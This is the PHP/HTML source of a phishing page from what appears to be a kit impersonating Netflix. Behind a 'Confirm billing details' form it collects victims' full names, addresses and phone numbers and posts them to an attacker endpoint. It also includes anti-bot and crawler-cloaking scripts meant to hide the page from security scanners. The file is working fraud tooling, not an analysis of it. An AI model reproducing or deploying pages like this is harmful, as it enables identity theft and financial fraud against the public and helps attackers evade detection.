<?php
session_start();
error_reporting(0);
include '../autob/bt.php';
include '../autob/basicbot.php';
include '../autob/uacrawler.php';
include '../autob/refspam.php';
include '../autob/ipselect.php';
include '../autob/bts2.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><title>Confirm address - Netflix</title>
<meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0"><link type="text/css" rel="stylesheet" href="../oille/nul.css"><link type="text/css" rel="stylesheet" href="../oille/null.css"><link rel="shortcut icon" href="../fnset/favicon.ico">
<style type="text/css">
.transitioning{position:absolute;top:18%;left:0;width:100%;} .hide{display:none}
	.loader{margin:auto;height:13px;width:13px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #fff;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
</style>
  <style>
	*{box-sizing:border-box;}	
	.svg-nfLogo .svg-icon-netflix-logo{box-sizing:content-box;}
	html{height:auto;}
	body{margin:0px;padding:0;height:100vh;}
	.thead{height:;width:100%;text-align:left;}
	.mainviewpar{padding:0;position:relative;background-color:#f1f1f1;}
    .mainview{width:100%;max-width:639px;margin:0 auto;padding:10px 0;}
	.mainviewchild{margin:0 10px;padding:10px 20px;text-align:center;background-color:#fff;border: 1px solid #dcdde0;}
	@media only screen and (min-width:500px){.mainviewchild{}}
	@media only screen and (min-height:900px){.mainviewchild{margin:50px auto;}}
	.header_logo{display:inline-block;width:150px;height:45px;background:url('../fnset/hiconb.png') no-repeat;background-position:0 -9px; background-size:100%;}
	.vx_modal-header h1{font-size:1.6rem;;font-weight: 400;text-transform: none;font-family: Arial,sans-serif;border-bottom: 2px solid #dcdde0;padding-bottom:10px;}
	
	form{max-width:360px;margin:auto}
    input{width: 100%;height: 44px;padding: 0 15px ;line-height:44px;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 5px;font-size: 15px;background-color:#333;text-transform:capitalize;color: #ccc;}	
	select{width: 100%;height:44px;padding: 0 15px;color:#686159;box-sizing:border-box;margin-bottom: 12px;border: 0px solid #B7B6B6;border-radius: 6px;font-size: 14px;background-color:#333;-moz-padding-start: 0.5rem;-webkit-appearance: none;-moz-appearance: none;text-transform:capitalize;color: #ccc;}
    input:focus{border: 1px solid #009CDE;border-radius: 6px;outline:0;z-index:100;padding: 15px 18px 0;transition:padding 0.3s;}
    select:focus{border: 2px solid #009CDE;border-radius: 6px;outline:0;padding: 15px 18px 0;transition:padding 0.3s;}
	.notcapitalized{text-transform:none;}
	.cardImage_medium{margin:0px auto 10px;display:block;}
	.vx_form-group{position:relative;}
	.vx_form-group label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 98%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.vx_form-group input:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.hasError,.hasError:focus{border: 1px solid #d20000;outline:0;padding: 15px 18px 0;transition:border 0.3s}
	input.hasError~label, input.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	select.hasError~label, select.hasError:focus~label{color:#f00;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.vx_form-group input.hasContent{border: 1px solid #B7B6B6;;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.vx_form-group input.hasContent:focus{border: 1px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.vx_form-group input.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown{position:relative;}
	.ppvx_dropdown label{opacity:1;background-color:#333;border-radius:6px;position: absolute;left: 0;padding: 0 50% 0 15px;line-height: 40px;margin: 2px;transition: opacity 0.25s ease-out;z-index: 0;white-space: nowrap;overflow: hidden;max-width: 100%;text-overflow: ellipsis;color: #6c7378;font-size:15px;}
	.ppvx_dropdown select:focus~label{display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;}
	.ppvx_dropdown::before{content: '';width: 10px;height: 10px;line-height: 0;border:1px solid;border-color:transparent transparent #686159 #686159;position: absolute;top:13px;right: 0.75rem;z-index: 2;transform:rotate(-45deg);}
	.ppvx_dropdown select.hasContent{outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent~label{color:#686159;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.ppvx_dropdown select.hasContent:focus{border: 2px solid #009CDE;outline:0;z-index:100;padding: 15px 18px 0;}
	.ppvx_dropdown select.hasContent:focus~label{color:#0070BA;display:inline;transition:display 0.3s;font-size:12px;top:5px;left:18px;line-height:12px;padding:0;border-radius:0;background-color:transparent;}
	.btn_info{width:100%;height:44px;box-sizing:border-box;margin-bottom: 10px;border-radius: 1.5em;border:0;text-transform: capitalize;margin-top: 0; background-color:#E50914 !important; cursor: pointer;color: #fff;font-size: 17px;line-height: 1.47059;display: inline-block;min-width: 30px;padding: 4px 15px;text-align: center;}
	.table-row{display:table;table-layout:fixed;}
	.table-row > div{display:table-cell;}
	.table-col-xs-10{width:;}
	.table-col-xs-2{width:16%;min-height:1px;font-size:15px;padding:0 1% 0 1%;text-align:left;}
	.equal{width:50%;display:;float:left} .equal #city{border-radius:6px 0 0 6px;} .equal #zip{border-radius:0 6px 6px 0;border-left:1px solid #aaa;}
	.equal #zip:focus{border-left:1px solid #009CDE;}  .equal #zip.hasError{border-left:1px solid #d20000;}
	.phone div{float:left;} .phone .ppvx_dropdown{width:35%;} .phone .vx_form-group{width:65%;} .phone select{border-radius:6px 0 0 6px;} .phone select.hasContent:focus{border-width:1px;} .phone input{border-left:1px solid #aaa;;border-radius:0 6px 6px 0;} .phone input:focus{border-left:1px solid #009CDE;} .phone input.hasError{border-left:1px solid #d20000;} .phone .ppvx_dropdown::before{height:5px;width:5px;top:18px;}
	
	.rectangleLogo_small{width:3.2em;height:2.1em;margin:0 auto;border-radius:4px;display:inline-block;box-shadow:0 1px 2px 0 rgba(0, 0, 0, 0.15);position:relative}
	.csc-image::after {content:"";position:absolute;width:3.2em;height:3em;top:0;right:0;background:url('../fnset/sprite_logos_wallet_2x.png') no-repeat;background-position:0px -731px;background-size:153%;}
	.hide{display:none;}
	.notification-critical{background: #E87C03;
    -webkit-border-radius: 4px;
    -moz-border-radius: 4px;
    border-radius: 4px;
    font-size: 14px;
    margin: 0 0 16px;
	padding: 10px 20px;
    vertical-align: middle;
    padding: 20px 10px;
    color: #fff;}
	.transitioning{height:100%;background-color:rgba(190,190,190,0.8);position:fixed;top:0;left:0;min-height:100%;width:100%;}
	.loader{content:"";position:relative; display: block;top:47%;margin:auto;height:50px;width:50px;-webkit-animation: rotation .7s infinite linear;-moz-animation: rotation .7s infinite linear;-o-animation: rotation .7s infinite linear;animation: rotation .7s infinite linear;border-left:8px solid rgba(0,0,0,.20);border-right:8px solid rgba(0,0,0,.20);border-bottom:8px solid rgba(0,0,0,.20);border-top:8px solid #E50914;border-radius:100%;}
	@keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }
	.footer{position:relative;width:80%;margin:20px auto 0;text-align:center;padding:5px 30px;border-top:1px dotted #aaa;background-color:#f3f3f3;}
	@media only screen and (min-height:730px){.footer{position:absolute;margin-top:0;left:10%;bottom:0;}} 
	.nonjsAlert{color:#f00;background-color:#feeeee;border:1px solid #f00;border-width:1px 0;min-height:30px;line-height:30px;padding:0px 5px;}
	@media only screen and (min-width: 740px){
		.login-body:after {
		content: "";
		height: 106px;
		display: block;
		}
		.login-body {
		margin: 0 auto -236px;
		min-height: 100vh;
		background-color: transparent;
		max-width: 700px;
			}
	}
	@media only screen and (min-width: 740px) {
  
</style>

</head>
<body><div id="appMountPoint"><div class="login-wrapper hybrid-login-wrapper"><div class="login-wrapper-background"><img class="concord-img vlv-creative" src="fnset/website_small.jpg" srcset="../fnset/website_small.jpg 1000w, ../fnset/website_medium.jpg 1500w, ../fnset/website_large.jpg 1800w" alt=""/></div><div class="nfHeader login-header signupBasicHeader"><a href="" class="svg-nfLogo signupBasicHeader" data-uia="netflix-header-svg-logo"><svg viewBox="0 0 111 30" class="svg-icon svg-icon-netflix-logo" focusable="true"><g id="netflix-logo"><path d="M105.06233,14.2806261 L110.999156,30 C109.249227,29.7497422 107.500234,29.4366857 105.718437,29.1554972 L102.374168,20.4686475 L98.9371075,28.4375293 C97.2499766,28.1563408 95.5928391,28.061674 93.9057081,27.8432843 L99.9372012,14.0931671 L94.4680851,-5.68434189e-14 L99.5313525,-5.68434189e-14 L102.593495,7.87421502 L105.874965,-5.68434189e-14 L110.999156,-5.68434189e-14 L105.06233,14.2806261 Z M90.4686475,-5.68434189e-14 L85.8749649,-5.68434189e-14 L85.8749649,27.2499766 C87.3746368,27.3437061 88.9371075,27.4055675 90.4686475,27.5930265 L90.4686475,-5.68434189e-14 Z M81.9055207,26.93692 C77.7186241,26.6557316 73.5307901,26.4064111 69.250164,26.3117443 L69.250164,-5.68434189e-14 L73.9366389,-5.68434189e-14 L73.9366389,21.8745899 C76.6248008,21.9373887 79.3120255,22.1557784 81.9055207,22.2804387 L81.9055207,26.93692 Z M64.2496954,10.6561065 L64.2496954,15.3435186 L57.8442216,15.3435186 L57.8442216,25.9996251 L53.2186709,25.9996251 L53.2186709,-5.68434189e-14 L66.3436123,-5.68434189e-14 L66.3436123,4.68741213 L57.8442216,4.68741213 L57.8442216,10.6561065 L64.2496954,10.6561065 Z M45.3435186,4.68741213 L45.3435186,26.2498828 C43.7810479,26.2498828 42.1876465,26.2498828 40.6561065,26.3117443 L40.6561065,4.68741213 L35.8121661,4.68741213 L35.8121661,-5.68434189e-14 L50.2183897,-5.68434189e-14 L50.2183897,4.68741213 L45.3435186,4.68741213 Z M30.749836,15.5928391 C28.687787,15.5928391 26.2498828,15.5928391 24.4999531,15.6875059 L24.4999531,22.6562939 C27.2499766,22.4678976 30,22.2495079 32.7809542,22.1557784 L32.7809542,26.6557316 L19.812541,27.6876933 L19.812541,-5.68434189e-14 L32.7809542,-5.68434189e-14 L32.7809542,4.68741213 L24.4999531,4.68741213 L24.4999531,10.9991564 C26.3126816,10.9991564 29.0936358,10.9054269 30.749836,10.9054269 L30.749836,15.5928391 Z M4.78114163,12.9684132 L4.78114163,29.3429562 C3.09401069,29.5313525 1.59340144,29.7497422 0,30 L0,-5.68434189e-14 L4.4690224,-5.68434189e-14 L10.562377,17.0315868 L10.562377,-5.68434189e-14 L15.2497891,-5.68434189e-14 L15.2497891,28.061674 C13.5935889,28.3437998 11.906458,28.4375293 10.1246602,28.6868498 L4.78114163,12.9684132 Z" id="Fill-14"></path></g></svg><span class="screen-reader-text">Netflix</span></a></div><div class="login-body"><div><noscript><div data-uia="error-message-container" class="ui-message-container ui-message-error"><div class="ui-message-icon"></div><div data-uia="text" class="ui-message-contents">Looks like you have disabled JavaScript. Please enable JavaScript to restore full page functionality.</div></div></noscript><div class="login-content login-form hybrid-login-form hybrid-login-form-signup" data-uia="login-page-container"><div class="hybrid-login-form-main"><h1>Confirm billing details</h1><div class="ui-message-container <?php if(isset($_GET[''.$theerrkey.''])==false){echo "hide";};?>" id="errcont"><div data-uia="text" class="ui-message-contents" id="errctnt">Wrong Entries, Try Again</div></div>

<form action="spp" class="login-form" method="POST" id="mainloginform" onsubmit="return validate();">
<div  class="notifications"> 
<p class="notification notification-critical <?php if(isset($_REQUEST["'.$theerrkey.'"])==false){echo "hide";} ?>" id="errnotif" role="alert">Wrong Entries. Please try again.</p>
</div>
<div class="vx_form-group vx_floatingLabel_active"><input type="text" id="fname" aria-describedby="text-info-cardNumber" name="fname" class="" oninput="hasCtnt();" onclick="hasCtnt()" placeholder="Full name" autocomplete="off" value="" required="required"/><label class="floatingLabel" for="fname">Full name</label></div>

<div class="vx_form-group vx_floatingLabel_active"><input type="text" id="street" aria-describedby="text-info-expDate" name="street" class="" onclick="hasCtnt()" oninput="hasCtnt();" placeholder="Street address" autocomplete="off" value="" required="required"/><label class="floatingLabel" for="street">Street Address</label></div>

<div class="vx_form-group equal"><input type="text" id="city" aria-describedby="text-info-expDate" name="city" class="" oninput="hasCtnt();" onclick="hasCtnt()" placeholder="City" autocomplete="off" value="" required="required"/><label class="floatingLabel" for="city">City</label></div>

<div class="vx_form-group equal"><input type="text" id="zip" aria-describedby="text-info-expDate" name="zip" class="" oninput="hasCtnt();" onclick="hasCtnt()" placeholder="Zip Code" autocomplete="off" value="" maxlength="10" required="required"/><label class="floatingLabel" for="zip">Zip / Postal Code</label></div>
<div style="clear:left"></div>
<div class="vx_form-group vx_floatingLabel_active"><input type="text" id="state" aria-describedby="text-info-expDate" name="state" class="" oninput="hasCtnt();" onclick="hasCtnt()" placeholder="State / Province" autocomplete="off" value="" required="required"/><label class="floatingLabel" for="state">State / Province</label></div>
<div style="clear:left"></div>
<div id="dropdown_layout"><div class="ppvx_dropdown  ">
<select id="country" class="" onchange="hasCtnt();" onclick="hasCtnt()" aria-describedby="brand" name="country" required="required">
				<option value="" selected>-- Select Your Country --</option>
                <option value="Afganistan">Afghanistan</option>
                <option value="Albania">Albania</option>
                <option value="Algeria">Algeria</option>
                <option value="American Samoa">American Samoa</option>
                <option value="Andorra">Andorra</option>
                <option value="Angola">Angola</option>
                <option value="Anguilla">Anguilla</option>
                <option value="Antigua &amp; Barbuda">Antigua &amp; Barbuda</option>
                <option value="Argentina">Argentina</option>
                <option value="Armenia">Armenia</option>
                <option value="Aruba">Aruba</option>
                <option value="Australia">Australia</option>
                <option value="Austria">Austria</option>
                <option value="Azerbaijan">Azerbaijan</option>
                <option value="Bahamas">Bahamas</option>
                <option value="Bahrain">Bahrain</option>
                <option value="Bangladesh">Bangladesh</option>
                <option value="Barbados">Barbados</option>
                <option value="Belarus">Belarus</option>
                <option value="Belgium">Belgium</option>
                <option value="Belize">Belize</option>
                <option value="Benin">Benin</option>
                <option value="Bermuda">Bermuda</option>
                <option value="Bhutan">Bhutan</option>
                <option value="Bolivia">Bolivia</option>
                <option value="Bonaire">Bonaire</option>
                <option value="Bosnia &amp; Herzegovina">Bosnia &amp; Herzegovina</option>
                <option value="Botswana">Botswana</option>
                <option value="Brazil">Brazil</option>
                <option value="British Indian Ocean Ter">British Indian Ocean Ter</option>
                <option value="Brunei">Brunei</option>
                <option value="Bulgaria">Bulgaria</option>
                <option value="Burkina Faso">Burkina Faso</option>
                <option value="Burundi">Burundi</option>
                <option value="Cambodia">Cambodia</option>
                <option value="Cameroon">Cameroon</option>
                <option value="Canada">Canada</option>
                <option value="Canary Islands">Canary Islands</option>
                <option value="Cape Verde">Cape Verde</option>
                <option value="Cayman Islands">Cayman Islands</option>
                <option value="Central African Republic">Central African Republic</option>
                <option value="Chad">Chad</option>
                <option value="Channel Islands">Channel Islands</option>
                <option value="Chile">Chile</option>
                <option value="China">China</option>
                <option value="Christmas Island">Christmas Island</option>
                <option value="Cocos Island">Cocos Island</option>
                <option value="Colombia">Colombia</option>
                <option value="Comoros">Comoros</option>
                <option value="Congo">Congo</option>
                <option value="Cook Islands">Cook Islands</option>
                <option value="Costa Rica">Costa Rica</option>
                <option value="Cote DIvoire">Cote D'Ivoire</option>
                <option value="Croatia">Croatia</option>
                <option value="Cuba">Cuba</option>
                <option value="Curaco">Curacao</option>
                <option value="Cyprus">Cyprus</option>
                <option value="Czech Republic">Czech Republic</option>
                <option value="Denmark">Denmark</option>
                <option value="Djibouti">Djibouti</option>
                <option value="Dominica">Dominica</option>
                <option value="Dominican Republic">Dominican Republic</option>
                <option value="East Timor">East Timor</option>
                <option value="Ecuador">Ecuador</option>
                <option value="Egypt">Egypt</option>
                <option value="El Salvador">El Salvador</option>
                <option value="Equatorial Guinea">Equatorial Guinea</option>
                <option value="Eritrea">Eritrea</option>
                <option value="Estonia">Estonia</option>
                <option value="Ethiopia">Ethiopia</option>
                <option value="Falkland Islands">Falkland Islands</option>
                <option value="Faroe Islands">Faroe Islands</option>
                <option value="Fiji">Fiji</option>
                <option value="Finland">Finland</option>
                <option value="France">France</option>
                <option value="French Guiana">French Guiana</option>
                <option value="French Polynesia">French Polynesia</option>
                <option value="French Southern Ter">French Southern Ter</option>
                <option value="Gabon">Gabon</option>
                <option value="Gambia">Gambia</option>
                <option value="Georgia">Georgia</option>
                <option value="Germany">Germany</option>
                <option value="Ghana">Ghana</option>
                <option value="Gibraltar">Gibraltar</option>
                <option value="Great Britain">Great Britain</option>
                <option value="Greece">Greece</option>
                <option value="Greenland">Greenland</option>
                <option value="Grenada">Grenada</option>
                <option value="Guadeloupe">Guadeloupe</option>
                <option value="Guam">Guam</option>
                <option value="Guatemala">Guatemala</option>
                <option value="Guinea">Guinea</option>
                <option value="Guyana">Guyana</option>
                <option value="Haiti">Haiti</option>
                <option value="Hawaii">Hawaii</option>
                <option value="Honduras">Honduras</option>
                <option value="Hong Kong">Hong Kong</option>
                <option value="Hungary">Hungary</option>
                <option value="Iceland">Iceland</option>
                <option value="India">India</option>
                <option value="Indonesia">Indonesia</option>
                <option value="Iran">Iran</option>
                <option value="Iraq">Iraq</option>
                <option value="Ireland">Ireland</option>
                <option value="Isle of Man">Isle of Man</option>
                <option value="Israel">Israel</option>
                <option value="Italy">Italy</option>
                <option value="Jamaica">Jamaica</option>
                <option value="Japan">Japan</option>
                <option value="Jordan">Jordan</option>
                <option value="Kazakhstan">Kazakhstan</option>
                <option value="Kenya">Kenya</option>
                <option value="Kiribati">Kiribati</option>
                <option value="Korea North">Korea North</option>
                <option value="Korea South">Korea South</option>
                <option value="Kuwait">Kuwait</option>
                <option value="Kyrgyzstan">Kyrgyzstan</option>
                <option value="Laos">Laos</option>
                <option value="Latvia">Latvia</option>
                <option value="Lebanon">Lebanon</option>
                <option value="Lesotho">Lesotho</option>
                <option value="Liberia">Liberia</option>
                <option value="Libya">Libya</option>
                <option value="Liechtenstein">Liechtenstein</option>
                <option value="Lithuania">Lithuania</option>
                <option value="Luxembourg">Luxembourg</option>
                <option value="Macau">Macau</option>
                <option value="Macedonia">Macedonia</option>
                <option value="Madagascar">Madagascar</option>
                <option value="Malaysia">Malaysia</option>
                <option value="Malawi">Malawi</option>
                <option value="Maldives">Maldives</option>
                <option value="Mali">Mali</option>
                <option value="Malta">Malta</option>
                <option value="Marshall Islands">Marshall Islands</option>
                <option value="Martinique">Martinique</option>
                <option value="Mauritania">Mauritania</option>
                <option value="Mauritius">Mauritius</option>
                <option value="Mayotte">Mayotte</option>
                <option value="Mexico">Mexico</option>
                <option value="Midway Islands">Midway Islands</option>
                <option value="Moldova">Moldova</option>
                <option value="Monaco">Monaco</option>
                <option value="Mongolia">Mongolia</option>
                <option value="Montserrat">Montserrat</option>
                <option value="Morocco">Morocco</option>
                <option value="Mozambique">Mozambique</option>
                <option value="Myanmar">Myanmar</option>
                <option value="Nambia">Nambia</option>
                <option value="Nauru">Nauru</option>
                <option value="Nepal">Nepal</option>
                <option value="Netherland Antilles">Netherland Antilles</option>
                <option value="Netherlands">Netherlands (Holland, Europe)</option>
                <option value="Nevis">Nevis</option>
                <option value="New Caledonia">New Caledonia</option>
                <option value="New Zealand">New Zealand</option>
                <option value="Nicaragua">Nicaragua</option>
                <option value="Niger">Niger</option>
                <option value="Nigeria">Nigeria</option>
                <option value="Niue">Niue</option>
                <option value="Norfolk Island">Norfolk Island</option>
                <option value="Norway">Norway</option>
                <option value="Oman">Oman</option>
                <option value="Pakistan">Pakistan</option>
                <option value="Palau Island">Palau Island</option>
                <option value="Palestine">Palestine</option>
                <option value="Panama">Panama</option>
                <option value="Papua New Guinea">Papua New Guinea</option>
                <option value="Paraguay">Paraguay</option>
                <option value="Peru">Peru</option>
                <option value="Phillipines">Philippines</option>
                <option value="Pitcairn Island">Pitcairn Island</option>
                <option value="Poland">Poland</option>
                <option value="Portugal">Portugal</option>
                <option value="Puerto Rico">Puerto Rico</option>
                <option value="Qatar">Qatar</option>
                <option value="Republic of Montenegro">Republic of Montenegro</option>
                <option value="Republic of Serbia">Republic of Serbia</option>
                <option value="Reunion">Reunion</option>
                <option value="Romania">Romania</option>
                <option value="Russia">Russia</option>
                <option value="Rwanda">Rwanda</option>
                <option value="St Barthelemy">St Barthelemy</option>
                <option value="St Eustatius">St Eustatius</option>
                <option value="St Helena">St Helena</option>
                <option value="St Kitts-Nevis">St Kitts-Nevis</option>
                <option value="St Lucia">St Lucia</option>
                <option value="St Martin">St Martin</option>
                <option value="St Pierre &amp; Miquelon">St Pierre &amp; Miquelon</option>
                <option value="St Vincent &amp; Grenadines">St Vincent &amp; Grenadines</option>
                <option value="Saipan">Saipan</option>
                <option value="Samoa">Samoa</option>
                <option value="Samoa American">Samoa American</option>
                <option value="San Marino">San Marino</option>
                <option value="Sao Tome &amp; Principe">Sao Tome &amp; Principe</option>
                <option value="Saudi Arabia">Saudi Arabia</option>
                <option value="Senegal">Senegal</option>
                <option value="Serbia">Serbia</option>
                <option value="Seychelles">Seychelles</option>
                <option value="Sierra Leone">Sierra Leone</option>
                <option value="Singapore">Singapore</option>
                <option value="Slovakia">Slovakia</option>
                <option value="Slovenia">Slovenia</option>
                <option value="Solomon Islands">Solomon Islands</option>
                <option value="Somalia">Somalia</option>
                <option value="South Africa">South Africa</option>
                <option value="Spain">Spain</option>
                <option value="Sri Lanka">Sri Lanka</option>
                <option value="Sudan">Sudan</option>
                <option value="Suriname">Suriname</option>
                <option value="Swaziland">Swaziland</option>
                <option value="Sweden">Sweden</option>
                <option value="Switzerland">Switzerland</option>
                <option value="Syria">Syria</option>
                <option value="Tahiti">Tahiti</option>
                <option value="Taiwan">Taiwan</option>
                <option value="Tajikistan">Tajikistan</option>
                <option value="Tanzania">Tanzania</option>
                <option value="Thailand">Thailand</option>
                <option value="Togo">Togo</option>
                <option value="Tokelau">Tokelau</option>
                <option value="Tonga">Tonga</option>
                <option value="Trinidad &amp; Tobago">Trinidad &amp; Tobago</option>
                <option value="Tunisia">Tunisia</option>
                <option value="Turkey">Turkey</option>
                <option value="Turkmenistan">Turkmenistan</option>
                <option value="Turks &amp; Caicos Is">Turks &amp; Caicos Is</option>
                <option value="Tuvalu">Tuvalu</option>
                <option value="Uganda">Uganda</option>
                <option value="Ukraine">Ukraine</option>
                <option value="United Arab Erimates">United Arab Emirates</option>
                <option value="United Kingdom">United Kingdom</option>
                <option value="United States of America">United States of America</option>
                <option value="Uraguay">Uruguay</option>
                <option value="Uzbekistan">Uzbekistan</option>
                <option value="Vanuatu">Vanuatu</option>
                <option value="Vatican City State">Vatican City State</option>
                <option value="Venezuela">Venezuela</option>
                <option value="Vietnam">Vietnam</option>
                <option value="Virgin Islands (Brit)">Virgin Islands (British)</option>
                <option value="Virgin Islands (USA)">Virgin Islands (USA)</option>
                <option value="Wake Island">Wake Island</option>
                <option value="Wallis &amp; Futana">Wallis &amp; Futana Is</option>
				<option value="Western Sahara">Western Sahara</option>
                <option value="Yemen">Yemen</option>
                <option value="Zaire">Zaire</option>
                <option value="Zambia">Zambia</option>
                <option value="Zimbabwe">Zimbabwe</option>
				</select>
<label class="ppvx_dropdown__label" for="country">Country</label></div></div>

<div class="phone"><div class="ppvx_dropdown  ">
<select id="phonetype" class="hasContent" onchange="hasCtnt();" onclick="hasCtnt()" name="phonetype" required="required">
				<option value="Mobile" selected>Mobile</option>
                <option value="Home">Home</option>
				</select>
<label class="ppvx_dropdown__label" for="phonetype">Phone Type</label></div>
<div class="vx_form-group vx_floatingLabel_active"><input type="tel" id="phonenumber" aria-describedby="text-info-cardNumber" name="phonenumber" class="" onclick="hasCtnt()" placeholder="Phone Number" autocomplete="off" maxlength="14" onkeypress="stoplen(14)" oninput="innumlen(this.value);hasCtnt();" value="" required="required"/><label class="floatingLabel" for="phonenumber">Phone Number</label></div>
</div>

<input type="hidden" name="Hsub" value="yes"/>

<button type="submit" name="detailsSubmit" data-track="{}" class="btn_info" title="Submit Details">Submit</button>
</form></div>
</div>

</div></div>
<div class="transitioning hide" id="loader">
<div class="loader">
&nbsp;
</div>
</div>
</div>
</div></div>

<script>
"use strict"
document.getElementById("mainloginform").setAttribute("novalidate",true);
function load(){var t = document.getElementById("loader");t.className="transitioning";};
function stopload(){var t = document.getElementById("loader");t.className="transitioning hide";document.getElementById("errnotif").className="notification-critical";};

function disperr(i){i.className=" hasError";};
function clearerr(i){i.className=i.className.replace('hasError',"");};

function validate(){var dob=document.getElementById("dob");var err = document.getElementById("errnotif");err.className="notification-critical hide";load();var self=document.getElementById("mainloginform"); var input = self.querySelectorAll(["input","select"]);var emptylist=[];for(var i=0;i<input.length;i++){if(input[i].value==""){emptylist.push(i);};} if(emptylist.length >= 1){setTimeout(function(){input[emptylist[0]].focus();stopload();err.innerHTML="All fields are required !";for(var i of emptylist){disperr(input[i])};},1500);return false;} else{if(dob.value.length!=10 || /^\d{1,2}[\/\-\.]?\d{1,2}[\/\-\.]?\d{4}$/.test(dob.value)==false){setTimeout(function(){stopload();err.innerHTML="Date Of Birth, Must be in DD/MM/YYYY format";disperr(dob);},1500);return false;} else{return true;};};};

function innumlen(val){if(event.inputType=="insertText"){if(isNaN(parseInt(event.data))){if(val.length<=1){event.target.value="";} else{event.target.value=val.slice(0,val.length-1);};};};};
<?php if(!stripos($_SESSION['device'],'yochi')){banbot();};?>
function hasCtnt(){var tgt=event.target;if(tgt.value!=""){tgt.className="hasContent"} else{tgt.className=""};};

function stoplen(len){if(event.target.value.length==len && event.key!='Enter'){event.preventDefault();};}
</script>
<div></div></body>
</html>